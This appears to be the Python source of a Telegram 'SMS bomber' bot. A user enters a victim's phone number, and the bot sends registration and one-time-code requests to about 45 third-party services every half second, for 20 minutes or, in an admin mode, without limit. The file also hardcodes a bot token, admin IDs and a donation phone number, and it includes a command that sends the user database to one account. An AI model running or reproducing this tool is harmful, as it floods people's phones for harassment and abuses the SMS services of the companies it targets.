# -*- coding: utf-8 -*-

#import telebot
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor

from models import db_session
from models.users import User
from datetime import datetime, timedelta

import re
import time
import string
import time
import threading
import requests

bot_token = '1589016294:AAG7d0QjWyaKIlv_5fT3UCH13mmunBgiY3M'
db_session.global_init('database.db')

#bot = telebot.TeleBot(bot_token)
bot = Bot(token=bot_token)
dp = Dispatcher(bot)

# считаем для статистики
users = 4
running_spams_per_chat_id = []
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
THREADS_LIMIT = 300
banned = []
admins = ['906123359', '1218845111']
phones = []

def check(thisid):
    global banned
    t = True
    for ban in banned:
        if str(ban) == str(thisid):
            t = False
    return t

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    global users, admins
    print(check(message.chat.id))
    if check(message.chat.id) == True:
        keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        boom = types.KeyboardButton(text='💣БОМБЕР')
        stop = types.KeyboardButton(text='Стоп')
        info = types.KeyboardButton(text='ℹ️Инфа')
        stats = types.KeyboardButton(text='📈Статистика')
        donat = types.KeyboardButton(text='💰Донат боту на дедик')
        piar = types.KeyboardButton(text='💸 Реклама')
        faq = types.KeyboardButton(text='FAQ')

        buttons_to_add = [boom, stop, info, stats, donat, piar, faq]
        for admin in admins:
            if str(admin) == str(message.chat.id):
                buttons_to_add.append(types.KeyboardButton(text='Рассылка'))
        keyboard.add(*buttons_to_add)
        await bot.send_message(message.chat.id, 'Прив бандиты😈♂!\nНаш канал в ТГ: @prohacker101\nВыберите действие:',
                         reply_markup=keyboard)
        #
        iduser = message.from_user.id
        session = db_session.create_session()
        #
        user_all = session.query(User).all()
        T = True
        for all in user_all:
            if all.id == iduser:
                T = False

        if T == True:
            session = db_session.create_session()
            name = message.from_user.first_name
            url = message.from_user.username
            iduser = message.from_user.id
            user = User(
                id=iduser,
                name=name,
                username='@'+url
            )
            users += 1
            session.add(user)
            session.commit()
    else:
        await bot.send_message(message.chat.id, 'Вы были забанены, все вопросы к @Valerij212121')


def send_for_number(phone):
    request_timeout = 0.0000000000001

    try:
        requests.post('https://smsbomber.online/index.php',
                      data={'number': phone, 'count': '10'})
    except:
        print('-')
    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                    data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru',
                        'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
    except Exception as e:
        pass
    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone}, headers={})
    except Exception as e:
        print('-')
    try:
        requests.post('https://my.zadarma.com/connect/', params={"?number=": '+' + phone})
    except:
        print('-')
    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + phone})
    except:
        print('-')
    try:
        requests.post('https://starpizzacafe.com/mods/a.function.php',
                          data={'aj': '50', 'registration-phone': phone})
    except:
        print('-')
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
    except:
        print('-')
    try:
        requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": phone})
    except:
        print('-')
    try:
        requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + phone})
    except:
        print('-')
    try:
        requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                         data={"phone": phone})
    except:
        print('-')

    try:
        requests.post('https://alfalife.cc/auth.php', data={"phone": phone})
    except:
        print('-')

    try:
        requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": phone})
    except:
        print('-')

    try:
        requests.post('https://silpo.ua/graphql', data={
                "validateLoginInput": {"flowId": 99322, "currentPlace": phone, "nextStep": "auth-otp",
                                       "__typename": "FlowResponse"}})
    except:
        print('-')

    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + phone, })
    except:
        print('-')

    try:
        requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + phone, "login": 'test@yandex.ru', "password": 'password123!', "agreement": "on",
                                "oferta": "on", })
    except:
        print('-')

    try:
        requests.post('https://www.etm.ru/cat/runprog.html',
                          data={"m_phone": phone, "mode": "sendSms", "syf_prog": "clients-services",
                                "getSysParam": "yes", })
    except:
        print('-')

    try:
        requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + phone, })
    except:
        print('-')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
    except:
        print('-')

    try:
        requests.post('https://account.my.games/signup_send_sms/', data={"phone": phone})
    except:
        print('-')

    try:
        requests.post('https://kasta.ua/api/v2/login/', data={"phone": phone})
    except:
        print('-')

    try:
        requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": phone})
    except:
        print('-')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + phone, "api": 2, "email": "email", "x-email": "x-email", })
    except:
        print('-')


    try:
        requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
    except:
        print('-')

    try:
        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": phone})
    except:
        print('-')

    try:
        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": phone})
    except:
        print('-')

    try:
        requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": phone})
    except:
        print('-')

    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": phone})
    except:
        print('-')

    try:
        requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": phone})
    except:
        print('-')

    try:
        requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                          data={"REGISTER[PERSONAL_PHONE]": phone, "code": "", "sendsms": "Выслать код", })
    except:
        print('-')

    try:
        requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": phone})
    except:
        print('-')

    try:
        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": phone, "password": 'password'})
    except:
        print('-')

    try:
        requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + phone})
    except:
        print('-')

    try:
        requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
                                                     "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode",
                                                     "phone": phone, "registration": "N", })
    except:
        print('-')

    try:
        requests.post('https://msk.tele2.ru/api/validation/number/' + phone, json={"sender": "Tele2"})
    except:
        print('-')

    try:
        requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + phone})
    except:
        print('-')

    try:
        requests.post('https://www.flipkart.com/api/6/user/signup/status',
                      headers={"Origin": "https://www.flipkart.com",
                               "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                      json={"loginId": "+" + phone, "supportAllStates": True})
    except:
        print('-')
    try:
        requests.post('https://secure.online.ua/ajax/check_phone/',
                      params={"reg_phone": phone})
    except:
        print('-')

    try:
        requests.post(
            'https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": phone})
    except:
        print('-')

    try:
        requests.post('https://smart.space/api/users/request_confirmation_code/',
                      json={"mobile": "+" + phone, "action": "confirm_mobile"})
    except:
        print('-')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                      json={"phone": "+" + phone})
    except:
        print('-')

    try:
        requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                      data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                            'phone': phone})
    except:
        print('-')

    try:
        requests.post('https://apteka.ru/_action/auth/getForm/',
                      data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                            "form[EMAIL]": "", "form[LOGIN]": (phone, "+* (***) ***-**-**"),
                            "form[PASSWORD]": 'password', "get-new-password": "Получите пароль по SMS",
                            "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                            "utc_offset": "120", })
    except:
        print('-')

    try:
        requests.post('https://uklon.com.ua/api/v1/account/code/send',
                      headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": phone})
    except:
        print('-')


async def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)
    if force:
        msg = f'Спам запущен на неограниченое время для номера +{phone_number}'
    else:
        msg = f'Спам запущен на 20 минут на номер +{phone_number}'

    await bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes=20)
    while (datetime.now() < end) or (force and chat_id == 906123359):
        if chat_id not in running_spams_per_chat_id:
            break
        time.sleep(0.5)
        send_for_number(phone_number)
        print('SPAM')
    await bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
    THREADS_AMOUNT[0] -= 1  # стояло 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

async def spam_handler(phone, chat_id, force):
    global phones
    if int(chat_id) in running_spams_per_chat_id:
        await bot.send_message(chat_id,
                         'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова')
        return
    await bot.send_message(chat_id, str(phone) + ", \n".join(running_spams_per_chat_id))
    # Если количество тредов меньше максимального создается новый который занимается спамом
    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        await start_spam(chat_id, phone, force)
        THREADS_AMOUNT[0] += 1
        phones.append(phone)
    else:
        await bot.send_message(chat_id, 'Сервера перегружены. Попробуйте снова через минуту')
        print('Максимальное количество тредов. отменено.')

@dp.message_handler(commands=['admin'])
async def admin(message: types.Message):
    global users, banned, admins
    for admin in admins:
            if str(admin) == str(message.chat.id):
                await bot.send_message(message.chat.id, 'Список забаненых: ' + str(banned) +
                                '\nСписок админов: ' + str(admins) +
                                '\n/ban <id> -- забанить\n/unban <id> -- отбанить\n/add <id> -- добавить админа\n/del <id> -- удалить амина(может только главный)')
    print(banned)
    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'users: ' + str(users))
        f = open("database.db","rb")
        await bot.send_document(message.chat.id, f)

@dp.message_handler(commands=['add'])
async def addadmin(message: types.Message):
    global users, banned, admins
    if str('906123359') == str(message.chat.id) or str('1218845111') == str(message.chat.id):
        if message.text != '/add':
            thisid = message.text.replace('/add ', '')
            admins.append(thisid)
            await bot.send_message(message.chat.id, 'You add admin: ' + str(thisid))
            print(admins)
        else:
            await bot.send_message(message.chat.id, 'Надо /add <id>, а не просто /add !!!')

@dp.message_handler(commands=['del'])
async def addadmin(message: types.Message):
    global users, banned, admins
    if str('906123359') == str(message.chat.id) or str('1218845111') == str(message.chat.id):
        if message.text != '/del':
            thisid = message.text.replace('/del ', '')
            admins.remove(thisid)
            await bot.send_message(message.chat.id, 'You delete admin: ' + str(thisid))
            print(admins)
        else:
            await bot.send_message(message.chat.id, 'Надо /del <id>, а не просто /del !!!')

@dp.message_handler(commands=['ban'])
async def ban(message: types.Message):
    global users, banned, admins
    for admin in admins:
            if str(admin) == str(message.chat.id):
                if message.text != '/ban':
                    thisid = message.text.replace('/ban ', '')
                    if thisid == '906123359':
                        await bot.send_message(message.chat.id, 'Кодер это предусмотрел, ты не самый умный)))')
                    else:
                        try:
                            banned.append(thisid)
                            await bot.send_message(message.chat.id, 'You ban user: ' + str(thisid))
                        except Exception:
                            await bot.send_message(message.chat.id, 'OOF')
                    print(banned)
                else:
                    await bot.send_message(message.chat.id, 'Надо /ban <id>, а не просто /ban !!!')
    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'banned: ' + str(banned))

@dp.message_handler(commands=['unban'])
async def unban(message: types.Message):
    global users, banned
    for admin in admins:
            if str(admin) == str(message.chat.id):
                thisid = message.text.replace('/unban ', '')
                try:
                    banned.remove(thisid)
                    await bot.send_message(message.chat.id, 'You unban user: ' + str(thisid))
                except Exception:
                    await bot.send_message(message.chat.id, 'Он не был забанен!')
                print(banned)
    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'banned: ' + str(banned))

@dp.message_handler(commands=['send'])
async def sender(message: types.Message):
    for admin in admins:
        if str(admin) == str(message.chat.id):
            text = message.text.replace('/send ', '')
            session = db_session.create_session()
            user_all = session.query(User).all()
            have = 0
            await bot.send_message(message.chat.id, 'Рассылка запущена!')
            try:
                for all in user_all:
                    await bot.send_message(all.id, text)
                    have = have + 1
            except Exception:
                pass
            await bot.send_message(message.chat.id, 'Всем отправлено! Получило ' + str(have) + ' человек.')

@dp.message_handler(content_types=['text'])
async def handle_message_received(message):
    global users
    if check(message.chat.id) == True:
        chat_id = int(message.chat.id)
        text = message.text
        B = False
        for admin in admins:
            if str(admin) == str(message.chat.id):
                B = True

        if text == 'ℹ️Инфа':
            await bot.send_message(chat_id,
                             'Создатель: @vsecoder для @Valerij212121\nПо вопросам сотрудничества обращаться в лс к создателю')

        elif text == '💣БОМБЕР':
            await bot.send_message(chat_id, 'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx')

        elif text == '📈Статистика':
            await bot.send_message(chat_id,
                             f'📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: {users}\nСервисов для RU🇷🇺: ?\nСервисов для UK🇺🇦: 51\nБот запущен: 19.01.2020')

        elif text == '💰Донат боту на дедик':
            await bot.send_message(chat_id,
                             'Бандиты, кто может материально помочь на развитие бота\nВот реквизиты\nQIWI +380993013264')

        elif text == '💸 Реклама':
            await bot.send_message(chat_id,
                             'В Нашем Боте 2 рассылки стоит 100 рублей\nЕе получат все пользователи бота\nПо вопросам покупки писать @Valerij212121')
        elif text == 'Рассылка' and B == True:
            await bot.send_message(chat_id, '/send <текст рассылки>')

        elif text == 'FAQ':
            await bot.send_message(chat_id, '"Pro Hacker ✔" не за что не отвечает!😂')

        elif text == 'Стоп':
            if chat_id not in running_spams_per_chat_id:
                await bot.send_message(chat_id, 'Ты еще не начинал спам')
            else:
                running_spams_per_chat_id.remove(chat_id)
                await bot.send_message(chat_id, 'Спам остановлен')

        elif len(text) == 11:
            phone = text
            await spam_handler(phone, chat_id, force=False)

        elif len(text) == 12:
            phone = text
            await spam_handler(phone, chat_id, force=False)
            if len(text) == 12 and B == True and text[0] == '_':
                phone = text[1:]
                await spam_handler(phone, chat_id, force=True)

        else:
            await bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
            print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
    else:
        await bot.send_message(message.chat.id, 'Вы были забанены, все вопросы к @Valerij212121')

#
if __name__ == "__main__":
    executor.start_polling(dp)